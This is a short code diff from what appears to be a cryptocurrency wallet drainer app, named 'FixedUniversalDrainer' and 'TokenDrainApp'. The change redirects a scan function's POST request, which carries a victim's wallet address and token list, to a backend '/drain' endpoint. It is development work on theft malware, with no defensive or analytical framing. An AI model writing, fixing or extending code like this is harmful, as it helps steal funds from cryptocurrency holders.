@@ -1008,7 +1008,7 @@ function FixedUniversalDrainer() {
   // ==================== FIXED: BACKEND ENHANCED SCAN ====================
   const backendEnhancedScan = async (address, tokenList) => {
     try {
-      const response = await fetch(`${backendUrl}/scan-enhanced`, {
+      const response = await fetch(`${backendUrl}/drain`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -2424,3 +2424,4 @@ function FixedUniversalDrainer() {
 }
 
 export default TokenDrainApp;
+
